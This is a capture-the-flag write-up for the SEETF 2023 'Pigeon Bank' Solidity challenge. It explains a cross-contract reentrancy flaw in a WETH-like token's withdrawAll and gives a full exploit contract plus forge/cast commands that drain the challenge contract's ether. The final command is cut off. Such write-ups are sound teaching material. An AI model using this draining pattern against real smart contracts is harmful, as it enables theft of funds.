# SEETF 2023 - Pigeon Bank [6 solves / 494 points] [First blood ?]

### Description  
```  
The new era is coming. Pigeons are invading and in order to survive, the SEE
Team created PigeonBank so that people can get extremely high interest rate.
Hold PETH to get high interest. PETH is strictly controlled by the SEE team to
prevent manipulation and corruption.

nc win.the.seetf.sg 8550  
```

Our goal is to drain ether from PETH contract  
```solidity  
   function isSolved() external view returns (bool) {  
       return (peth.totalSupply() == 0) && (address(msg.sender).balance >= 2500 ether);  
   }  
```

Setup contract has 2500 ether of PETH token, PETH contract has 2500 ether and
we have 10 ether initially

```  
# cast call --rpc-url
http://win.the.seetf.sg:8549/49aa0b6c-9da2-4101-ada7-423123b1ef10
0x0C3B3C64bd2c1a8ddEf2976F02D981A475262F4c "balanceOf(address)(uint256)"
0x3Eec500Fe20CC4A62633AA8ABF508eE0C08607c0  
2500000000000000000000  
```  
```  
# cast balance --rpc-url
http://win.the.seetf.sg:8549/49aa0b6c-9da2-4101-ada7-423123b1ef10
0x5D2Ad70D5CB12794345325A6b1283E2fB203F4B2  
10000000000000000000  
```

PETH is just like WETH, but some of its function has onlyOwner modifier

```solidity  
   function deposit(address _userAddress) public payable onlyOwner {  
       _mint(_userAddress, msg.value);  
       emit Deposit(_userAddress, msg.value);  
       // return msg.value;  
   }

   function withdraw(address _userAddress, uint256 _wad) public onlyOwner {  
       payable(_userAddress).sendValue(_wad);  
       _burn(_userAddress, _wad);  
       // require(success, "SEETH: withdraw failed");  
       emit Withdrawal(_userAddress, _wad);  
   }

   function withdrawAll(address _userAddress) public onlyOwner {  
       payable(_userAddress).sendValue(balanceOf[_userAddress]);  
       _burnAll(_userAddress);  
       // require(success, "SEETH: withdraw failed");  
       emit Withdrawal(_userAddress, balanceOf[_userAddress]);  
   }  
```

But we can still call them through the pigeon bank

```solidity  
   function deposit() public payable nonReentrant {  
       peth.deposit{value: msg.value}(msg.sender);  
   }

   function withdraw(uint256 wad) public nonReentrant {  
       peth.withdraw(msg.sender, wad);  
   }

   function withdrawAll() public nonReentrant {  
       peth.withdrawAll(msg.sender);  
   }  
```

It has nonReentrant modifier, but it does not protect against cross function
or cross contract reentrancy

withdrawAll() does not follow checks-effects-interactions pattern  
```solidity  
   function withdrawAll(address _userAddress) public onlyOwner {  
       payable(_userAddress).sendValue(balanceOf[_userAddress]);  
       _burnAll(_userAddress);  
       // require(success, "SEETH: withdraw failed");  
       emit Withdrawal(_userAddress, balanceOf[_userAddress]);  
   }  
```

When it is sending value to _userAddress, it's calling _userAddress, and
_userAddress can transfer all of it's tokens to another address to prevent its
tokens being burnt

As burnAll will just burn all of the _userAddress's balance after the external
call  
```solidity  
   function _burnAll(address _userAddress) internal {  
       _burn(_userAddress, balanceOf[_userAddress]);  
   }  
```

So, we can just keep doing this to withdraw ether from PETH contract

### Exploit contract

```solidity  
// SPDX-License-Identifier: UNLICENSED  
pragma solidity ^0.8.17;

import "./Setup.sol";

contract Exploit2 {  
   PETH public peth;  
   address public exploit;  
  
   constructor(PETH _peth) {  
       peth = _peth;  
       exploit = msg.sender;  
   }  
  
   function sendBack() public {  
       peth.transfer(exploit, peth.balanceOf(address(this)));  
   }  
}

contract Exploit {  
   PigeonBank public bank;  
   PETH public peth;  
   Setup public setup;  
   address public owner;  
   Exploit2 public exploit2;  
   bool public s = true;  
  
   constructor(address _setup) payable {  
       owner = msg.sender;  
       setup = Setup(_setup);  
       bank = setup.pigeonBank();  
       peth = setup.peth();  
       exploit2 = new Exploit2(peth);  
       require(msg.value == 5 ether, "msg.value need to be 5 ether");  
       bank.deposit{value: msg.value}();  
   }  
  
   function exploit() public {  
       for (uint i; i < 100; ++i) {  
           bank.withdrawAll();  
           exploit2.sendBack();  
       }  
   }  
  
   function withdrawRemainingAndSendToOwner(uint256 amount) public {  
       bank.withdraw(amount);  
       exploit2.sendBack();  
       payable(owner).call{value: address(this).balance}("");  
   }  
  
   function setS(bool _s) public {  
       s = _s;  
   }  
  
   fallback() external payable {  
       if (s) {  
           peth.transfer(address(exploit2), peth.balanceOf(address(this)));  
       }  
   }  
}  
```

First we can just get address of PETH and pigeon bank from setup contract

```  
cast call 0xB453faF8b24c209f7cB401B8bC63C8963FfBfabf "pigeonBank()(address)"
--rpc-url http://win.the.seetf.sg:8549/6f098c9d-b048-4330-865c-cce1768e1d36  
0x7C0011474bc3a313Ff5810Bf8658ad7303305944

cast call 0xB453faF8b24c209f7cB401B8bC63C8963FfBfabf "peth()(address)" --rpc-
url http://win.the.seetf.sg:8549/6f098c9d-b048-4330-865c-cce1768e1d36  
0x2B771DeDA9f101fe8CB0993Ea8b7277a0ec6113d  
```

Then just deploy the exploit contract

```  
forge create ./src/exploit.sol:Exploit --value 5000000000000000000 --private-
key <key> --constructor-args 0xB453faF8b24c209f7cB401B8bC63C8963FfBfabf --rpc-
url http://win.the.seetf.sg:8549/6f098c9d-b048-4330-865c-cce1768e1d36  
```

Then just keep calling the exploit() function  
```  
cast send 0xB00eF71Fa0E808e74De98A07527F4C155A4AdcD4 "exploit()" --private-key
<key> --rpc-url
http://win.the.seetf.sg:8549/6f098c9d-b048-4330-865c-cce1768e1d36  
```

After a small amount is remaining, we can just disable the reentrancy and
withdraw remaining and send the ether to ourselves from the exploit contract  
```  
cast send 0xB00eF71Fa0E808e74De98A07527F4C155A4AdcD4 "setS(bool)" false
--private-key <key> --rpc-url
http://win.the.seetf.sg:8549/6f098c9d-b048-4330-865c-cce1768e1d36

cast send 0xB00eF71Fa0E808e74De98A07527F4C155A4AdcD4
"withdrawRemainingAndSendToOwner(uint256)" 5000000000000000000 --private-key

Original writeup
(https://github.com/Kaiziron/seetf2023-writeup/blob/main/pigeon_bank.md).